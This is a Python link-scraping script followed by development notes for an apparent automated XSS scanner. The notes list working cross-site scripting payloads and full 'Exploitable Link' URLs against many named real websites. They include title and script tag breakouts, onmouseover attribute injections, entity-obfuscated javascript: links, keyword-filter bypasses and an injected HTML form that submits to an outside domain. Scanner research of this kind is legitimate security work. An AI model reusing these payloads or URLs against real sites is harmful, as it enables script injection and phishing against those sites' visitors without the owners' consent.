
import re
from bs4 import BeautifulSoup
from WebRequest import web_request

def get_source(url):
        Web = web_request(url,'GET')
        source = Web.get_source()
        return source

def get_links(source):
        links = []
        soup = BeautifulSoup(source,features="lxml")
        tags = soup.find_all('a', href=True)
        # tags = tags + soup.find_all('link', href=True)
        for tag in tags:    
            if not str(tag['href']).__contains__('moz.com'):    links.append(tag['href'])
        # print(links)
        return links

def getlinks_fromfile(source):
    exp = re.compile('(?!\d)\w+\.[\w\.\w]+')
    links = exp.findall(source)
    return links

def core_url(data):
        exp = re.compile('https?:\/\/[\w]+?\.?\-?[\w]+\.[\.\w]+')
        core = exp.findall(data)
        # print('Core Url ', core)
        if not core: return ''
        return core

if __name__ == "__main__":
    # link = 'https://moz.com/top500'
    # source = get_source(link)

    files =  open('sample_data/websites.txt', 'r')
    source = files.read()
    links = getlinks_fromfile(source)

    print('working.....')
    newfile = open('sample_data/links.txt', 'a')
    for link in links: 
        newfile.write('https://www.' + str(link) + '\n' )
        print(link)
    print('\n\nDONE')




"""             
_____________________________________________________________________________________________________________________
==>>    UPDATES Created - DONE

1. Extract Unique GET Params.
2. If 2 forms have same 2 GET Params, then 4 GET URLs will be generated: DONE: later unique GET URLS are extracted
3. Payload Updated = (uvw"xyz'yxz</zxy. DONE
4. Encoding Check for each value of a context. 
    a. Resolved Issue: one value has encoding and others may not have..!!
5. Base Url for all websites. Resolved THE ISSUE of 'http://ifu-institut.at' and 'http://drudgereportarchives.com'
6. Now We Store the 'SUCCESSFUL_ATTACK_URL', 'Context_name and 'Detection' in the EXCEL FIle.. 
7. Created separate folder at Run-time for each WEBSITE, so all of its webpages data goes in that folder. 
8. Unique GET URLs:
    a. If [2] forms have same [2] GET Params, then [4] GET URLs will be generated and then [2] unique GET URLS are extracted
    b. BUT if they have DIFFERENT FORM ACTIONS, then there will be 4 UNIQUE GET URLS.

_____________________________________________________________________________________________________________________
==>>    UPDATES REQUIRED 

1.  script double quotes encapsulation. why it missed.. 
    a. https://www.airbnb.com.br/s/all?refinement_paths[]=/uvw%22xyz%27yxz%3Czxy&query=
    b. \"refinementPaths\":[\"/uvw\\\"xyz'yxz\u003czxy\"],
    c. NOW WHAT ..    

_____________________________________________________________________________________________________________________
==>> RESOLVED ISSUES:

1. data-digital-data has been detected..
2. HTML missing due to Nested <span Tag inside a <span Tag:  SUCCESSFULLY Detected. 
3. Attack Payload Detection:
4. Return Only the Value where XSS is present or there is a Bypass. 

_____________________________________________________________________________________________________________________
^^^ Remaining Issue:

1. script_single_quotes_outside
    re.compile(r'[=:]\s?\'[@\*!~|$_,}+*\\#\'*{*\s^*?\[\]*(*)*\/*.*\w*=:*&*;*\-*%*\d*]*'+ re.escape(attack))
2. This RegExp is Not fit for Script .. [=:] is alright, but [\"\'] is NOT.

_____________________________________________________________________________________________________________________
==>>    FINDINGS:

ISSUE NO. 1: 
1. https://www.burpee.com/search?q=(uvw"xyz'yxz</zxy
2. URL Context: Encoding is present and also absent for different attributes of the TAG e.g: <a> 
 <a class="b-breadcrumbs-keywords_link" href="/search?q=%28uvw%22xyz%27yxz%3C%2Fzxy" title="(uvw&quot;xyz'yxz&lt;/zxy">
3. Now, I think I have to break the tags in parts, in order to check this.
4. In my opinion, We shall give priority to the Non-Encoded and Non-Filtered attribute of the TAG.

------------------------------------------------------------------------------------------
ISSUE NO. 2:
-------------------------------------------------------------------
Confirmed by Ashar as "Edge Cases" for title , span and style Tags
--------------------------------------------------------------------
1. https://www.burpee.com/search?q=(uvw"xyz'yxz</zxy
2. payload <img src=x onerror="alert(1)"> dones not work, it is in the <title> tag.
3. if we first close the </title> TAG , then it is XSSed
4. payload </title><img src=x onerror="alert(1)"> is SUCCESSFUL
------------------------------------------------------------------------------------------

ISSUE NO. 3: Attack Methodology for URL CONTEXT 

1. Does it need any kind of Encoding Analysis..?
2. Or for every webpage we try all of the attacks form Your Chart
3. I'm Not very good with URL-Obfuscation, So, for now I have your payloads from js-fiddle
    a. http://jsfiddle.net/Qv6F4/1/ : <a href="ja&#9;vasc&#10;ript&#58;alert&#40;1&#41;">click</a>
    b. http://jsfiddle.net/Qv6F4/   : <a href="ja&#x00009;vasc&#x0000A;ript&#x0003A;alert&#x00028;1&#x00029;">click</a>

ISSUE NO. 4:
1. On https://www.crane.com
i.  <a href="/stationery/featured-products">Featured Products</a> 
ii. <a href="/stationery/best-sellers">Best Sellers</a>
2. The href value is merged with base Url to produce a complete link. 
 https://www.crane.com + href
3. So what's the update, are we going to do the same..
        YEAH I THINK WE SHOULD.. ====>> CommoN SensE :)


ISSUE NO. 5:    [Will Update it in the NEXT Versions]
1. https://www.moosejaw.com/content/ann-arbor-shop
2. could not detect all the get params, though webpage has One GET Form with 14 get params..!!
3. Couldn't Collect COMPLETE SOURCE with TOOL 
4. The Request was blocked, redirected to this url.
    https://www.moosejaw.com/block.html?url=L2NvbnRlbnQvYW5uLWFyYm9yLXNob3A/&uuid=e19e1fc0-8173-11ea-9ed7-bd65ae1f2e66&vid=
5. Block ID: e19e1fc0-8173-11ea-9ed7-bd65ae1f2e66

ISSUE 6:    [Will Update it in the NEXT Versions]
1. https://www.rei.com/
2. GET Input NOT captured  Libraries: {requests and urllib failed to load data or access website}
3. It has one GET Param = ['q']

ISSUE NO. 7:    [FIXED and Captured the Values]
https://atasteofkentucky.com/kentucky-derby-2020/
1. </span> Search results for &ldquo;(uvw&quot;xyz&#039;yxz&lt;/zxy&rdquo;</nav>
2. https://atasteofkentucky.com/?s=(uvw%22xyz%27yxz%3C/zxy&post_type=product
HTML NOT detected.. bcoz at both ends it has a closing tag.. Let's fix this.

ISSUE 8 : [FIXED and captured 2 script contexts, Manually verified]
1. https://celticbydesign.com/search?q=(uvw%22xyz%27yxz%3C/zxy
2. script tag missing . Recapture it with the updated RegExp for script


ISSUE 9: [FIXED and Captured 3 script contexts]
1. Check https://www.stevespanglerscience.com
2. https://www.stevespanglerscience.com/?s=(uvw"xyz'yxz</zxy&post_type=
3. Look for 2 or more script contexts... with updated RegExp

Issue 10: [I just wanted to Make sure that for every GET Param [name,value] pairs have correct value]  
1. Manual  => https://www.timberland.co.uk/shop/SearchDisplay?sType=SimpleSearch&catalogId=11159&searchSource=Q&beginIndex=0&storeId=7105&langId=-11&searchTerm=(uvw"xyz'yxz</zxy
2. Tool    => https://www.timberland.co.uk/shop/SearchDisplay?sType=SimpleSearch&catalogId=11159&searchSource=Q&beginIndex=0&storeId=7105&langId=-11&searchTerm=(uvw"xyz'yxz</zxy
[ So Tool-Created URL was SAME as Manual Finding of the URL]

----------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------

ISSUE 11:   [ Resolved ]
Unique GET URLs:
    a. If [2] forms have same [2] GET Params, then [4] GET URLs will be generated and then [2] unique GET URLS are extracted
    b. BUT if they have DIFFERENT FORM ACTIONS, then there will be 4 UNIQUE GET URLS.

ISSUE 12: [ Resolved: I updated the regex for script-single-quotes encapsulation to bypass colon : however stop at equal =]
1. https://www.stevespanglerscience.com
2. var woof_current_values = '{"s":"(uvw\\&quot;xyz\\&#039;yxz&lt;\/zxy","post_type":"","woof_text":"(uvw\\&quot;xyz\\&#039;yxz&lt;\/zxy"}';
3. let's say we have ' unescaped, then my RegExp stops at __"s":"__  i.e. r'[=:]\s?\"'
4. so how am I going to evaluate that..?? hmmm...!!

ISSUE 13: [Resolved: Tool Results are Correct | 2 HTML were present, script attack is for < sign ]
1. https://www.scientificamerican.com/
2. No HTML Context was present, but still HTML Attack is thrown
3. https://www.scientificamerican.com/search/?q=%3Cimg%20src=x%20onerror=%22xyz(1)%22%3E
4.  Script attack was thrown, when All the Mitigations are present
5. https://www.scientificamerican.com/search/?q=</script><script>alert(1)</script>
6. "title":"\"\"xyz'<\""},


ISSUE 14:  [Will Update it in the NEXT Versions]
1. https://spo.1sept.ru/spoarchive.php
2. check for GET URLs. Has one GET FORM and 2 hidden inputs

ISSUE 15: [Resolved: Updated regex for the URL Mitigation analysis]
1. https://www.redrivercatalog.com/search.html?addsearch=(uvw"xyz'yxz</zxy
2. Missed the URL Context Attack. As the special chars were NOT escaped.  


---------------------------------------------------------------------------------------------------------------------------
    -------- REMAINING --------
----------------------------------------------------------------------------------------------------------------------------

ISSUE 16:
1. ATTR Attack Url: https://www.datasheet4u.com/search.php?sWord=' onmouseover='alert`1`
2. FINAL OUTPUT: 
<link rel="canonical" href="/share_search.php?sWord=' onmouseover='alert`1`">
<input type="text" name="sWord" size="30" value="' onmouseover='alert`1`" style="width:300px;height:45px; border:solid 3px #1887DB; font-size:20">
3. The <input tag should not be here as ' is encapsulated with "

ISSUE 17:
1. https://www.wattpad.com/search/?q='; confirm`1`; '&ref=1
2. <script type="text/javascript">
        window.prefetched = {"search.stories.results.'; confirm`1`; '.false.false":{"data":{"total":0,"stories":[],"tags":[]}}};
    </script>
3. Mitigation is done with double quotes outside.. 

ISSUE 18:
1. https://www.wowhead.com/search?q='; confirm`1`; '
2.  <script>
        WH.Track.nonInteractiveEvent('Search', 'Total Results', "'; confirm`1`; '", 0);
        WH.Track.nonInteractiveEvent('Search', 'Database Results', "'; confirm`1`; '", 0);
    </script>
3. Mitigation is done with double quotes outside.. 
4. SAME FOR: 
    a. https://www.nejm.org/search?pageType=search&q='; confirm`1`; '&asug=
    b. https://www.mainichi.jp/search/?&q=&s='; confirm`1`; '
    c. https://www.sephora.fr/recherche?q=' onmouseover='alert`1`
    d. 

ISSUE 19:
1. https://www.airbnb.com.br
2. script context.2 has more than 1 occurence of xyz , where one of them has quotes encapsulations and others don't.
3. the program returns as mitigation is present in the form of quotes encapsulation. 
4. however it can be like that, e.g; if one of the appearance in the same script tag doesn't have mitigation..? 
5. Right..!! Come to think of it. ..!!

ISSUE Z: [I myself didn't understand the scheme here.. single quotes inside a bracket '[' ..? ]
1. script double quotes encapsulation. why it missed.. 
    a. https://www.airbnb.com.br/s/all?refinement_paths[]=/uvw%22xyz%27yxz%3Czxy&query=
    b. \"refinementPaths\":[\"/uvw\\\"xyz'yxz\u003czxy\"],
    c. NOW WHAT ..



----------------------------------------------------------------------------------------------------------------------------
        ----- FUTURE WORK -----
----------------------------------------------------------------------------------------------------------------------------

Task 1:
1. https://www.nejm.org/search?pageType=search&q=&asug=/uvw"xyz'yxz<zxy
2. script tag has 2 occurence of payload, first with url encoding and second with double quote escaping and encapsulation. 
3. We can Use Regex to split these 2 occurences and analyze them separately.. 


----------------------------------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------

Special Case 1:
1. https://www.borsheims.com/
2. Payload: 
</span></h1><div style="background-color:lightblue;"><h1>DrudgeReport Form</h1><form action="//www.drudgereportArchives.com/dsp/search.htm" method="GET" name="searchForm" target="_top" style="margin:0px;padding:0px;"> 			 			<input type="Text" class="dra" name="searchFor" size="20" maxlength="500" value=""> 			<input type="Submit" value="Search Archives" class="dra"> 		</form></div><h1><span><!--
3. Exploitable Link with Paylaod: 
https://www.borsheims.com/product-search?Search=%3C%2Fspan%3E%3C%2Fh1%3E%3Cdiv+style%3D%22background-color%3Alightblue%3B%22%3E%3Ch1%3EDrudgeReport+Form%3C%2Fh1%3E%3Cform+action%3D%22%2F%2Fwww.drudgereportArchives.com%2Fdsp%2Fsearch.htm%22+method%3D%22GET%22+name%3D%22searchForm%22+target%3D%22_top%22+style%3D%22margin%3A0px%3Bpadding%3A0px%3B%22%3E+%09%09%09+%09%09%09%3Cinput+type%3D%22Text%22+class%3D%22dra%22+name%3D%22searchFor%22+size%3D%2220%22+maxlength%3D%22500%22+value%3D%22%22%3E+%09%09%09%3Cinput+type%3D%22Submit%22+value%3D%22Search+Archives%22+class%3D%22dra%22%3E+%09%09%3C%2Fform%3E%3C%2Fdiv%3E%3Ch1%3E%3Cspan%3E%3C%21--

Special Case 2:
1. Exploitable Link:
https://www.tatsoul.com/supplies/index.php?main_page=advanced_search&search_in_description=1&keyword=xyz%27;%20conf%3Cirm(1);%20%27&inc_subcat=0&sort=20a
2. filtering alert, prompt, confirm and also <  So I used conf<irm :)

Special Case 3:
1. Exploitable Link:
https://www.petdoors.com/catalogsearch/result?q=%22/%3Exyz%3Cinput%20type=%22submit%22%20onmouseover=%22alert(1)%22/%3E%3C!--
2. filtering alert, confirm, prompt script in upper and lower case mixed.. 
3. 

"""

